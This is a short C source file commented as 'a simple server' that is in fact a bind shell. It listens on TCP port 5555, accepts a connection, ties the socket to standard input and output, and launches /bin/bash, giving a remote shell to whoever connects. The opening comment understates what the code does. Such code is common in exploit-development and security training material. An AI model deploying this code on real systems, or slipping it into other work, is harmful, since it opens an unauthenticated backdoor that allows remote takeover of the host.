/* A simple server in the internet domain using TCP
   The port number is passed as an argument */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>



int main(int argc, char *argv[])
{
	int sockfd, newsockfd, portno = 5555;
	socklen_t clilen;
	struct sockaddr_in serv_addr, cli_addr;

	//socket syscal
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	bzero((char *) &serv_addr, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = INADDR_ANY;
	serv_addr.sin_port = htons(portno);

	//bind
	bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr));

	//listen
	listen(sockfd,5);
	clilen = sizeof(cli_addr);

	//accept
	newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

	//redirect stdin/out/err
	dup2( newsockfd, 0 );  /* duplicate socket on stdout */
	dup2( newsockfd, 1 );  /* duplicate socket on stderr too */
	dup2( newsockfd, 2 );

	//shell
	execve("/bin/bash", 0,0);

	close(newsockfd);
	close(sockfd);

	return 0;
}

